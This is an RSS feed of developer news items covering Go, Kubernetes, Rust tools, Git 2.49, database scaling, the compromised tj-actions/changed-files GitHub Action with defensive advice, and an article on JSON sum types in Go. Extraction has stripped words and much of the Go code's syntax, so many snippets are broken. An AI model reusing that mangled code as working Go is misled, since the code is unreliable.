<?xml version="1.0" encoding="utf-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>Dev News</title><link>https://securenza.github.io/SecurityFeed/</link><description></description><item><title>Go is DOOMed</title><link>https://gitlab.com/cznic/doomgeneric/-/raw/master/sshot.png</link><author>/u/0xjnml</author><category>dev</category><category>reddit</category><category>go</category><pubDate>Sun, 16 Mar 2025 15:45:55 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>How the hell do I make this Go program faster?</title><link>https://www.reddit.com/r/golang/comments/1jcnqfi/how_the_hell_do_i_make_this_go_program_faster/</link><author>/u/yourpwnguy</author><category>dev</category><category>reddit</category><category>go</category><pubDate>Sun, 16 Mar 2025 15:18:31 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[So, I’ve been messing around with a Go program that: Writes the sorted output to a new fileSeems so straightforward man :( Except it’s slow as hell. Here’s my code: import ( "fmt" "os" "strings" "slices" )func main() { if len(os.Args) < 2 { fmt.Fprintln(os.Stderr, "Usage:", os.Args[0], "<file.txt>") return }// Read the input file f, err := os.ReadFile(os.Args[1]) if err != nil { fmt.Fprintln(os.Stderr, "Error reading file:", err) return } // Process the file lines := strings.Split(string(f), "\n") uniqueMap := make(map[string]bool, len(lines)) var trimmed string for _, line := range lines { if trimmed = strings.TrimSpace(line); trimmed != "" { uniqueMap[trimmed] = true } }// Convert map keys to slice ss := make([]string, len(uniqueMap)) i := 0 for key := range uniqueMap { ss[i] = key i++ } slices.Sort(ss) // Write to output file o, err := os.Create("out.txt") if err != nil { fmt.Fprintln(os.Stderr, "Error creating file:", err) return } defer o.Close() o.WriteString(strings.Join(ss, "\n") + "\n") I ran this on a big file, here's the link:It takes  to run. That’s unacceptable. My CPU (R5 4600H 6C/12T, 24GB RAM) should not be struggling this hard.I also profiled this code, Profiling Says: 1. Sorting (slices.Sort) is eating CPU. 2. GC is doing a world tour on my RAM. 3. map[string]bool is decent but might not be the best for this. I also tried the map[string] struct{} way but it's makes really minor difference.The Goal: I want this thing to finish in 2-3 seconds. Maybe I’m dreaming, but whatever.Any insights, alternative approaches, or even just small optimizations would be really helpful. Please if possible give the code too. Because I've literally tried so many variations but it still doesn't work like I want it to be. I also want to get better at writing efficient code, and squeeze out performance where possible.]]></content:encoded></item><item><title>GitOps Principles - Separate Repositories for App &amp; Kubernetes</title><link>https://www.reddit.com/r/kubernetes/comments/1jcn002/gitops_principles_separate_repositories_for_app/</link><author>/u/k8s_maestro</author><category>dev</category><category>reddit</category><category>k8s</category><pubDate>Sun, 16 Mar 2025 14:44:24 +0000</pubDate><source url="https://www.reddit.com/r/kubernetes/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Kubernetes</source><content:encoded><![CDATA[For a production-grade environment, the best practice is to keep the application source code and infra in separate Git repositories. Is it true GirOps Principle? As it ensures clear separation of concerns, security and operational stability.]]></content:encoded></item><item><title>xlskubectl — a spreadsheet to control your Kubernetes cluster</title><link>https://github.com/learnk8s/xlskubectl</link><author>/u/ponton</author><category>dev</category><category>reddit</category><category>k8s</category><pubDate>Sun, 16 Mar 2025 14:43:51 +0000</pubDate><source url="https://www.reddit.com/r/kubernetes/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Kubernetes</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>SuperMuxer: tiny and compact, dependency-free package to configure your HTTP routes</title><link>https://www.reddit.com/r/golang/comments/1jcmfrb/supermuxer_tiny_and_compact_dependencyfree/</link><author>/u/FlairPrime</author><category>dev</category><category>reddit</category><category>go</category><pubDate>Sun, 16 Mar 2025 14:18:10 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[Super  Go package to configure your HTTP routes using only the . Define routes, middlewares, groups, and subgroups effortlessly!This package acts like a : It is  and , providing everything you need in just  file with less than 200 lines of code.You want to  define your HTTP routes while using  the standard library.You want to define  for your routes, groups, and subgroups while still relying on the standard library.You  want to use  bloated with excessive functionalities that you might never use.]]></content:encoded></item><item><title>Building a UI for Kubernetes, Helpful or Useless?</title><link>https://www.reddit.com/r/kubernetes/comments/1jckjsm/building_a_ui_for_kubernetes_helpful_or_useless/</link><author>/u/Pavel-Lukasenko</author><category>dev</category><category>reddit</category><category>k8s</category><pubDate>Sun, 16 Mar 2025 12:39:36 +0000</pubDate><source url="https://www.reddit.com/r/kubernetes/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Kubernetes</source><content:encoded><![CDATA[Hey everyone. I'm have been using Kubernetes for the last two years now and somehow got tired of typing kubectl and other stuff via command line.I have built a native app that runs on my MacBook and helps me speed up cluster deployment, app publishing and debugging with the help of the UI.I don't know if that might be useful for anyone but I am really open to any feedback.Would you like trying it?]]></content:encoded></item><item><title>Ubuntu to Explore Rust-Based “uutils” as Potential GNU Core Utilities Replacement</title><link>https://www.cyberciti.biz/linux-news/ubuntu-to-explore-rust-based-uutils-as-potential-gnu-core-utilities-replacement/</link><author>Vivek Gite</author><category>dev</category><pubDate>Sun, 16 Mar 2025 12:17:36 +0000</pubDate><source url="https://www.cyberciti.biz/atom/">Dev - NixCraft</source><content:encoded><![CDATA[n a move that has sparked significant discussion within the Ubuntu Linux fan-base and community, Canonical, the company behind Ubuntu, has announced its intention to explore the potential replacement of GNU Core Utilities with the Rust-based "uutils" project. They plan to introduce new changes in Ubuntu Linux 25.10, eventually changing it to Ubuntu version 26.04 LTS release in 2026 as Ubuntu is testing Rust 'uutils' to overhaul its core utilities potentially. Let us find out the pros and cons and what this means for you as an Ubuntu Linux user, IT pro, or developer.]]></content:encoded></item><item><title>Big LLMs weights are a piece of history</title><link>https://antirez.com/news/147</link><author>freeatnet</author><category>dev</category><category>hn</category><pubDate>Sun, 16 Mar 2025 12:13:24 +0000</pubDate><source url="https://news.ycombinator.com/">HN Front</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>SteamOS 3.7.0 Preview Released (with KDE Plasma 6 &amp; beginnings of support for non-Steam Deck handhelds)</title><link>https://steamcommunity.com/games/1675200/announcements/detail/529841158837240757</link><author>/u/pihug12</author><category>dev</category><category>reddit</category><pubDate>Sun, 16 Mar 2025 12:10:48 +0000</pubDate><source url="https://www.reddit.com/r/linux/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Linux</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Docs – Open source alternative to Notion or Outline</title><link>https://github.com/suitenumerique/docs</link><author>maelito</author><category>dev</category><category>hn</category><pubDate>Sun, 16 Mar 2025 11:38:52 +0000</pubDate><source url="https://news.ycombinator.com/">HN Front</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Git 2.49 Released With Faster Packing, Rust Foreign Language Interface</title><link>https://www.phoronix.com/news/Git-2.49-Released</link><author>/u/corvus_192</author><category>dev</category><category>reddit</category><category>rust</category><pubDate>Sun, 16 Mar 2025 10:38:06 +0000</pubDate><source url="https://www.reddit.com/r/rust/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Rust</source><content:encoded><![CDATA[
Git 2.49 is out today as the latest feature update for this widely-used distributed version control system.
Git 2.49 delivers faster packing via name-hash v2, a new "git backfill" tool to address any missing historical blobs, "git clone" learned to make a shallow clone for a single commit that is not necessarily at the tip of any branch, lazy-loading missing files in a blobless clone, zlib-ng support preparations, and a foreign language interface for Rust has been added to the codebase.
This first bit of Rust code within Git introduces two new Rust crates: libgit-sys and libgit. Further work on Rust code within Git is being carried out for future Git releases.
Download and more details on the Git 2.49 release via the release announcement. Over on the GitHub blog are also more details on the Git 2.49 changes.]]></content:encoded></item><item><title>Introducing Eventure: A Powerful Event-Driven Framework for Python</title><link>https://github.com/enricostara/eventure</link><author>/u/jumpixel</author><category>dev</category><category>reddit</category><pubDate>Sun, 16 Mar 2025 09:24:11 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Czkawka/Krokiet 9.0 — Find duplicates faster than ever before</title><link>https://www.reddit.com/r/rust/comments/1jchjc4/czkawkakrokiet_90_find_duplicates_faster_than/</link><author>/u/krutkrutrar</author><category>dev</category><category>reddit</category><category>rust</category><pubDate>Sun, 16 Mar 2025 09:11:38 +0000</pubDate><source url="https://www.reddit.com/r/rust/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Rust</source><content:encoded><![CDATA[Today I released new version of my apps to deduplicate files - Czkawka/Krokiet 9.0The current version primarily focuses on refining existing features and improving performance rather than introducing any spectacular new additions.With each new release, it seems that I am slowly reaching the limits — of my patience, Rust’s performance, and the possibilities for further optimization.Czkawka is now at a stage where, at first glance, it’s hard to see what exactly can still be optimized, though, of course, it’s not impossible.Video, Duplicate (smaller prehash size), and Image cache (EXIF orientation + faster resize implementation) are incompatible with previous versions and need to be regenerated.Automatically rotating all images based on their EXIF orientationFixed a crash caused by negative time values on some operating systemsUpdated `vid_dup_finder`; it can now detect similar videos shorter than 30 secondsAdded support for more JXL image formats (using a built-in JXL → image-rs converter)Improved duplicate file detection by using a larger, reusable buffer for file readingAdded an option for significantly faster image resizing to speed up image hashingLogs now include information about the operating system and compiled app features(only x86_64 versions)Added size progress tracking in certain modesAbility to stop hash calculations for large files mid-processImplemented multithreading to speed up filtering of hard linksReduced prehash read file size to a maximum of 4 KBFixed a slowdown at the end of scans when searching for duplicates on systems with a high number of CPU coresImproved scan cancellation speed when collecting files to checkAdded support for configuring config/cache paths using the `CZKAWKA_CONFIG_PATH` and `CZKAWKA_CACHE_PATH` environment variablesFixed a crash in debug mode when checking broken files named `.mp3`Catching panics from symphonia crashes in broken files modePrinting a warning, when using `panic=abort`(that may speedup app and cause occasional crashes)Changed the default tab to “Duplicate Files”Added a window icon in WaylandDisabled the broken sort buttonAdded `-N` and `-M` flags to suppress printing results/warnings to the consoleFixed an issue where messages were not cleared at the end of a scanAbility to disable cache via `-H` flag(useful for benchmarking)This release is last version, that supports Ubuntu 20.04 github actions drops this OS in its runnersLinux and Mac binaries now are provided with two options x86_64 and arm64Arm linux builds needs at least Ubuntu 24.04Gtk 4.12 is used to build windows gtk gui instead gtk 4.10Dropping support for snap builds — too much time-consuming to maintain and testing(also it is broken currently)Removed native windows build krokiet version — now it is available only cross-compiled version from linux(should not be any difference)In the next version, I will likely focus on implementing missing features in Krokiet that are already available in Czkawka, such as selecting multiple items using the mouse and keyboard or comparing images.Although I generally view the transition from GTK to Slint positively, I still encounter certain issues that require additional effort, even though they worked seamlessly in GTK. This includes problems with popups and the need to create some widgets almost from scratch due to the lack of documentation and examples for what I consider basic components, such as an equivalent of GTK’s TreeView.Price — free, so take it for yourself, your friends, and your family. Licensed under MIT/GPL]]></content:encoded></item><item><title>Show HN: My high school team’s space probe</title><link>https://drive.google.com/file/d/1_9V6lBTIfDsPdKCohQBc5Ed5UzDbnsrI/view?usp=sharing</link><author>JohnOfOsgiliath</author><category>dev</category><category>hn</category><pubDate>Sun, 16 Mar 2025 08:48:09 +0000</pubDate><source url="https://news.ycombinator.com/">HN Front</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>&quot;Gunyah Hypervisor Software - Supporting Protected VMs in Android Virtualization Framework&quot; by Elliot Berman and &quot;Co-written with Prakruthi Deepak Heragu&quot; (January 28, 2024)</title><link>https://www.qualcomm.com/developer/blog/2024/01/gunyah-hypervisor-software-supporting-protected-vms-android-virtualization-framework</link><author>/u/throwaway16830261</author><category>dev</category><category>reddit</category><pubDate>Sun, 16 Mar 2025 08:35:52 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Popular GitHub Action `tj-actions/changed-files` has been compromised with a payload that appears to attempt to dump secrets</title><link>https://semgrep.dev/blog/2025/popular-github-action-tj-actionschanged-files-is-compromised/</link><author>/u/alexeyr</author><category>dev</category><category>reddit</category><pubDate>Sun, 16 Mar 2025 06:24:24 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[Popular GitHub Action tj-actions/changed-files has been compromised (GitHub issue) with a payload that appears to attempt to dump secrets, impacting thousands of CI pipelines. This isn’t the first security issue with tj-actions/changed-files—see prior vulnerability CVE-2023-51664. Switch to a safer alternative or inline your file-change detection logic.Just removing it from the main branch of your repository won’t be enough — it could still run on other branches depending on how your actions are configured. So you need to remove it from  branches to be safe.You’ll need a list of GitHub Actions used at your org. Run this query on your codebase:$ semgrep -e 'uses: $ACTION' -l yaml --json .github  | jq -r '.results[].extra.metavars["$ACTION"].abstract_content' | grep -vE '^(actions/|docker://|[.]/[.]github/|tj-actions/)' | awk -F'@' '{print $1 "@*,"}' | sort | uniq
DataDog/synthetics-ci-github-action@*,
actions-rs/toolchain@*,
astral-sh/setup-uv@*,
aws-actions/amazon-ecr-login@*,Remove tj-actions/changed-files from the list of GitHub Actions.Generally, pin all GitHub Actions to specific commit SHAs (rather than version tags) you know are safe. In this case, it appears that all versions are compromised.Audit past workflow runs for signs of compromise. Check logs for suspicious outbound network requests. Prioritize repos where your CI runner logs are public, as secrets are dumped to stdout in the payload.]]></content:encoded></item><item><title>When a junior/entry SWE job lists Kubernetes &amp; Docker what do they expect you to know?</title><link>https://www.reddit.com/r/kubernetes/comments/1jceuxe/when_a_juniorentry_swe_job_lists_kubernetes/</link><author>/u/Bobsthejob</author><category>dev</category><category>reddit</category><category>k8s</category><pubDate>Sun, 16 Mar 2025 05:49:56 +0000</pubDate><source url="https://www.reddit.com/r/kubernetes/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Kubernetes</source><content:encoded><![CDATA[If its not a DevOps job, but for example I have seen some backend dev jobs where as part of the requirements they list the usual CI/CD best practices, and Docker, and K8s ~ but what do they actually expect you to know in an interview for K8s? Thanks (edit explanation)]]></content:encoded></item><item><title>Top 15 Database Scaling Techniques</title><link>https://blog.algomaster.io/p/top-15-database-scaling-techniques</link><author>Ashish Pratap Singh</author><category>dev</category><enclosure url="https://substack-post-media.s3.amazonaws.com/public/images/42a63987-4801-4374-81ca-d8453943b6c7_1238x874.png" length="" type=""/><pubDate>Sun, 16 Mar 2025 04:53:21 +0000</pubDate><source url="https://blog.algomaster.io/">Dev - Algomaster</source><content:encoded><![CDATA[When your application is small, with just a few hundred users, a  is usually enough to handle all the reads, writes, and transactions.But as your , so does the volume of data and database operations. More users mean more queries per second, more concurrent connections, and larger datasets.If you don't scale your database to handle the increased load, it can  your app and cause problems.In this article we will explore the 15 Database Scaling Techniques to ensure your application keeps operating at optimal performance without the database becoming a bottleneck., also known as , is the process of increasing the capacity of a single database server by adding more resources—CPU, RAM, disk storage, or network bandwidth. – You replace the existing machine with a higher-capacity one. This might involve switching to a server with more CPU cores, higher memory, or better disk performance (e.g., moving from HDDs to NVMe SSDs).Increasing Resource Allocations – If you're using a cloud provider (AWS, GCP, Azure), you can resize instances dynamically. For example, upgrading from an AWS RDS  instance to a  instance.Database Engine Optimizations – Tuning configurations such as increasing buffer pool size in MySQL () or allocating more shared memory in PostgreSQL (). – Moving from traditional HDDs to SSDs or leveraging NVMe storage to reduce disk I/O bottlenecks.When Should You Consider Using Vertical Scaling?When your workload fits within the limits of a single machine and you want  without introducing the complexity of distributed databases.When , and distributing queries across multiple nodes introduces unwanted overhead.When your application is still , and horizontal scaling (sharding or replication) is unnecessary.When you need a quick and cost-effective solution in the short term without redesigning the system architecture.Limitations of Vertical Scaling – There's a ceiling to how much you can scale a single machine. Even the largest cloud instance has limits. – A vertically scaled database is a single machine. If it crashes, everything goes down unless there's a failover mechanism.Expensive Beyond a Certain Point – The cost of high-end machines grows exponentially. A top-tier AWS RDS instance can cost thousands of dollars per month. – Increasing CPU, memory, or disk space often requires downtime, especially in on-premise setups.Vertical scaling is simple, effective, and easy to implement, making it a great first step for scaling a database. However, as traffic grows, a single machine will eventually hit a hard limit, forcing a move toward horizontal scaling techniques like sharding or replication. is a technique used to speed up database queries by creating a data structure that allows for faster lookups. Instead of scanning the entire table to find relevant rows, an index acts like a  in a book—helping the database locate data quickly.Imagine searching for a word in a dictionary. Without an index, you’d have to read every page. But with an alphabetically sorted index, you can jump directly to the correct section. That’s exactly how a database index works.Creating an index on a single column that is frequently used in  clauses. Example:CREATE INDEX idx_users_email ON users(email);An index on multiple columns, useful when queries filter by multiple conditions. Example:CREATE INDEX idx_orders_customer_date ON orders(customer_id, order_date);When Should You Consider Using Indexing?When queries frequently  by a specific column (, , ).When performing  on large tables.When optimizing , where fast lookups are more critical than fast writes. – Every , , or  operation must also update the index, increasing overhead. – Indexes consume additional disk space, sometimes larger than the actual table.Not Useful for Every Query – If a query retrieves a large portion of the table, an index may not help and could even slow it down. – Too many indexes can slow down performance instead of improving it. Choosing the right indexes is key.Indexing is one of the most powerful ways to scale a database without adding more hardware. However, it requires careful planning. The  can improve query performance by orders of magnitude, while  can slow down writes and waste storage. is the process of storing frequently accessed data in a  to reduce database load and improve response times. Instead of repeatedly querying the database for the same data, applications can retrieve it from a , which is significantly faster.There are multiple caching strategies (read through, cache aside, write back etc.,) each suited for different use cases.The  pattern is widely used because it gives the application full control over caching logic.When a client requests data, the application first checks the cache.If the data exists in cache (), it is returned instantly.If data is not found (), it is fetched from the database, stored in the cache for future requests, and returned to the client.Content Delivery Network (CDN) CachingFor web applications, static content (images, videos, scripts) is cached at CDN edge servers, reducing database and server load.When Should You Consider Using Caching?When the same data is frequently accessed, such as user profiles, product catalogs, or search results.When you need , especially for real-time applications.When your database is experiencing  and you want to reduce direct database queries.When serving  like images, CSS, and JavaScript in web applications. – If the cache is not updated when the database changes, users might see outdated information.Cache Invalidation Complexity – Deciding when to refresh or expire cached data is challenging. – Caching requires additional memory (RAM), which can be expensive at scale.Not Ideal for Write-Heavy Applications – Since caches mainly optimize read performance, write-heavy applications don’t benefit as much.Caching is one of the most effective database scaling techniques because it reduces query load and improves response times. However, it requires careful cache invalidation strategies to ensure data consistency.]]></content:encoded></item><item><title>Decoding JSON sum types in Go without panicking</title><link>https://nicolashery.com/decoding-json-sum-types-in-go/</link><author>/u/FoxInTheRedBox</author><category>dev</category><category>reddit</category><pubDate>Sun, 16 Mar 2025 04:42:06 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[The Go programming language doesn't have native support for sum types, but we'll see how we can emulate them, how to decode and encode them into JSON, and how in some cases they can help avoid runtime panic exceptions.Whether we find them useful or not, sum types existMany languages support sum types natively: Zig, TypeScript, OCaml, Rust, just to name a few. Even OpenAPI has them, the de-facto standard and language-agnostic way to define HTTP APIs using JSON. So even if the programming language you're using doesn't natively support sum types, you may still need to handle a JSON payload over the wire that is modeled as one. This requires deciding how to decode that payload in your language of choice.Personal feelings about sum types aside, I think most people would agree they effectively model data structures that can be "one of these (potentially very different) things, and nothing else". And once you've experienced sum types with a  or match expression combined with , it's hard to go back.Let's take a primitive type, a boolean or  in Rust. It has 2 possible values:  or  (also called "cardinality"). A struct or record is called a  because you can count the number of possible values (or cardinality) by  the number of possible values of each field. So if I have a struct with 2 boolean fields (example here in Rust):
    signed_up
    subscribedThe number of possible values for this struct (or "product type") is: 2x2 = .Now I didn't choose this struct example completely at random. Some of the possible values are not valid in this particular domain: a user can't be  if they are not  as well. You'll also hear the phrase "make illegal states unrepresentable" when talking about sum types.A  is called that way because... you guessed it. You can count the number of possible values (or cardinality) by  the number of possible values of each branch. So if I have the following sum type (example still in Rust, where they are called "enums"): subscribedThe number of possible values for this "sum type" is: 1+2 = .I'll leave it as an exercise to the reader to discuss and decide which of these two data structures is better adapted for representing this particular domain.My first nil pointer panic in Go was due to lack of sum typesOk, that section title is a bit cheeky and probably not entirely true. But when I figured out what caused the panic in my code, the thought "sum types would've caught this at compile time"  cross my mind. I'm sure the astute reader could find better ways to structure my first implementation, even without sum types. But humor me for the sake of this article.Let me say it now: This is  one of those "Go should have sum types" post. A lot has already been written on the topic and I don't want to get into the debate (although you'll probably guess where I stand). Let's just assume I want to  something like sum types in Go, then:How do I do so without straying too far from what's idiomatic in the language?How do I encode and decode it, to and from JSON, with the structure we'll see below?This post is also  a criticism of Go. I came across this issue in my first Go project, and I actually enjoyed working with the language. Having shied away from Go for a while (notably because of lack of sum types), I finally gave it a try because it seemed a good fit for this project. The fast compile times, robust standard library, simplicity of the language, and great developer tooling all delivered on their promise.For the anecdote, the first time I ran  was on the sample codebase from Alex Edward's "Let's Go Further" book (excellent book by the way), and I had to run it again because it was so much faster than what I was used to ( Haskell ), I thought nothing had happened.Back to the historical context: I'm feeling very productive with Go on this particular project. The feedback loop is amazing, and I have a working proof-of-concept in just a couple of days. Code seems to just slip from my fingers, everything works on the first try, zero values and pointers do not scare me anymore, I just need to add this last thing and... then it hits me:2024/12/07 12:16:53 http: panic serving [::1]:60984:
runtime error: invalid memory address or nil pointer dereference
goroutine 4 [running]:
net/http.(*conn).serve.func1()
    /usr/local/go/src/net/http/server.go:1947 +0xb0
panic({0x100a00f00?, 0x100f19b00?})
    /usr/local/go/src/runtime/panic.go:785 +0x124
example/main.TransformAction(0x14000115e08)
    /Users/nicolashery/dev/example/main.go:110 +0x1c
example/main.(*Server).handleTransformActions(0x140001cad80, {0x100ad6358, 0x14000160380}, 0x140001597c0)
    /Users/nicolashery/dev/example/main.go:157 +0x20c
[...]Ouch. Having done a lot of Haskell and (strict) TypeScript recently, I had forgotten one could get such runtime errors. But I don't panic (pun intended), and I carefully look at the code mentioned in the stack trace.Below is a simplified version of the code for the sake of this article (the actual implementation had bigger structures and more cases). Can you spot the error? You have 5 seconds.a Action result  aType  ActionType_CreateObject
		result  fmt aObjectType aObjectID aObjectName ActionType_UpdateObject
		result  fmt aObjectType aObjectID aObjectName ActionType_DeleteObject
		result  fmt aObjectID ActionType_DeleteAllObjects
		result  result
Ok, obviously you'll want to  on  to see what it is: Action 
	Type   ActionType 
	Object Object    
	ID     object Object Action  Action
		Type   ActionType_CreateObject
		Object objectobject Object Action  Action
		Type   ActionType_UpdateObject
		Object objectid  Action  Action
		Type ActionType_DeleteObject
		IDid Action  Action
		Type ActionType_DeleteAllObjectsDid you see the error? If yes, then you can stop reading now and get back to work. I'm joking. Didn't see it in the allowed time limit? Don't worry, the Go type checker couldn't either.Decoding JSON sum types in Go, take oneHow did I get to the code above, you might wonder? Well, imagine our service is receiving a JSON payload that looks like this:These are all different types of "actions", and this JSON representation is not unreasonable. The OpenAPI specification has a discriminator "pet" example, and the Redocly documentation a "vehicle" example, that are similar to this. (I have yet to come across an API with pets so apologies my example will be the less fun, but maybe more realistic.)My naive attempt to decode this JSON, because I was in a rush (and maybe also because Copilot suggested it, if I'm being honest), was to create a struct which I call . This is a struct with all possible fields for every action type merged, and using pointers. The zero-value of pointers is  which will be set for fields that are "unused" by a particular action type. Here it is in all its glory: Action 
	Type   ActionType 
	Object Object    
	ID      ActionType 
	ActionType_CreateObject     ActionType 
	ActionType_UpdateObject     ActionType 
	ActionType_DeleteObject     ActionType 
	ActionType_DeleteAllObjects ActionType This works because  doesn't care if there are missing fields in the JSON payload, it will just set the zero-value for them:actions Action err  jsondataactions err  err
We can also go the other way and call  to encode the struct into the same JSON representation as the snippet above. The  struct tag option will remove fields unused by each action type from the resulting JSON.So we're off to the races, what can go wrong with a bag of pointers? Subtle bugs when trying to access a field that is  because unused by that action type, that's what: aType  ActionType_CreateObject
	result  fmt aObjectType aObjectID aObjectName ActionType_UpdateObject
	result  fmt aObjectType aObjectID aObjectName ActionType_DeleteObject
	result  fmt aObjectID ActionType_DeleteAllObjects
	result How do OpenAPI and Protobuf handle this?I pick myself up after this runtime panic, and have the following genius idea: There are code generators for OpenAPI, if I give them the specification for the JSON discriminated union above, what do they output for Go? Also, Protocol Buffers is a popular wire format that is based on code generation, and the Oneof field looks a lot like a sum type, so what do  generate for Go?The OpenAPI schema for an action would look like this: object
   type
     object
   string
    If I feed this to the OpenAPI Generator (note that I'm using the useOneOfDiscriminatorLookup=true option for better output), I get what I'll call a "bag of all the branches": Action 
	createObject     CreateObject
	updateObject     UpdateObject
	deleteObject     DeleteObject
	deleteAllObjects DeleteAllObjects
 CreateObject 
	Object Object It generates an  method for  that:first decodes the JSON to check the  field (this is thanks to the useOneOfDiscriminatorLookup=true codegen option)according to the value of , it chooses the appropriate branch and decodes the JSON using the corresponding struct (, , etc.)Edited for clarity, it looks something like this:a Actiondata  tagged 
		Type ActionType  err  jsondatatagged err  err
	 err  taggedType  ActionType_CreateObject
		err  jsondataacreateObject ActionType_UpdateObject
		err  jsondataaupdateObject ActionType_DeleteObject
		err  jsondataadeleteObject ActionType_DeleteAllObjects
		err  jsondataadeleteAllObjectsTo get the actual underlying value, the generator creates a method (which I'll name  here) that returns the first non-nil pointer:a Action any  acreateObject  acreateObject
	 aupdateObject  aupdateObject
	 adeleteObject  adeleteObject
	 adeleteAllObjects  adeleteAllObjects
	So this is already a big improvement on my  approach. Since the accessor method to the underlying value returns , I'm now checking the  which can be one of the more precise structs (, , etc.):action Action result  v  actionCreateObject
		result  fmt vObjectType vObjectID vObjectNameUpdateObject
		result  fmt vObjectType vObjectID vObjectNameDeleteObject
		result  fmt vIDDeleteAllObjects
		result  result
Some issues remain though:I "trust" the  return value of the accessor method to be one of the action structs (, , etc.) and nothing elseIf I add a "branch" (i.e. another action type), I can easily forget to update the  statement in Another generator that I tried out, oapi-codegen, uses a slightly different approach. It holds on to a  and delays the decoding until we call an equivalent of the  accessor method: Action 
	union jsonRawMessage
 CreateObject 
	Type   
	Object Object a Actionany errThe decoding works essentially the same, first decode enough to check the  field, then according to its value unmarshal into one of the action structs (, , etc.). The  documentation actually has a similar example.Since delaying JSON decoding wasn't particularly useful in my case, I didn't choose this route. But I wanted to mention it for completeness' sake.What about  (aka "Protobuf")? I found the following particularly interesting in their Go generated code guide:For a oneof field, the protobuf compiler generates a single field with an interface type . It also generates a struct for each of the singular fields within the oneof. These all implement this  interface.Let's try it out. Even though we're working with a JSON API, a Protobuf definition for our data model could look like this: value  create_object  update_object  delete_object  delete_all_objects  object The generated code indeed creates an interface  with a single method, as well as an  struct that holds a field with that interface type: Action 
	Value isAction_Value  isAction_Value  Action_CreateObject 
	CreateObject CreateObject Action_CreateObjectNow these two code generators, OpenAPI and Protobuf, will be the inspiration for my second attempt at decoding the JSON sum type in a more type-safe way...Decoding JSON sum types in Go, take twoAfter a bit of searching on the topic of "Go sum types", I stumbled across this: go-check-sumtype. From the README:A typical proxy for representing sum types in Go is to use an interface with an unexported method and define each variant of the sum type in the same package to satisfy said interface. This guarantees that the set of types that satisfy the interface is closed at compile time.This "interface with an unexported method" (also called "sealed interface", or "marker interface") sounded like a reasonable way to do it. And it's also what the Protobuf codegen seems to be using.I replaced my single "bag of all the fields"  struct with a sealed interface  and a struct for each variant (, , etc.). Each variant struct implements the interface: IsAction  CreateObject 
	Object Object CreateObject UpdateObject 
	Object Object UpdateObject DeleteObject 
	ID DeleteObject DeleteAllObjects DeleteAllObjectsNow I am quite pleased. Not only do these action-specific structs provide more type-safety, but if I forget to handle a variant in my  statement (or if I add a new one that implements the sealed interface), the  linter will catch it instead of getting an error at runtime!action Action result  v  actionCreateObject
		result  fmt vObjectType vObjectID vObjectNameUpdateObject
		result  fmt vObjectType vObjectID vObjectNameDeleteObject
		result  fmt vIDDeleteAllObjects
		result  result
I still needed to figure out how to decode the JSON sum types payload into this interface and structs. You can't unmarshal into an interface value directly, you need to pass a concrete type. So I created a wrapper struct like so: Action 
	value IsAction
I also found the exhaustive linter, so why stop at sum types when you can also have enums! I defined one for action types, which are used as "tags" in my tagged union, along with the proper methods for JSON and string representations: ActionType 
	ActionType_CreateObject ActionType 
	ActionType_UpdateObject
	ActionType_DeleteObject
	ActionType_DeleteAllObjects
t ActionTypet ActionTypedata t ActionTypeI then defined  for my  wrapper struct like so:a Actiondata  tag 
		Type ActionType  err  jsondatatag err  err
	 v IsAction
	 tagType  ActionType_CreateObject
		v CreateObject ActionType_UpdateObject
		v UpdateObject ActionType_DeleteObject
		v DeleteObject ActionType_DeleteAllObjects
		v DeleteAllObjects err  jsondata v err  err
	

	avalue  v
	This works similarly to what we saw in the OpenAPI generated code:first decode only what is needed in the JSON to check the  fieldsecond, according to the value of , choose the appropriate variant struct of the sum type (, , etc.) and use it to decode the JSON payloadFor the other way around, I also defined  for the wrapper struct:a Action
	v  avalue

	data err  jsonv err  err
	 tagged any
	 err  jsondatatagged err  err
	 vCreateObject
		tagged ActionType_CreateObject
	UpdateObject
		tagged ActionType_UpdateObject
	DeleteObject
		tagged ActionType_DeleteObject
	DeleteAllObjects
		tagged ActionType_DeleteAllObjects
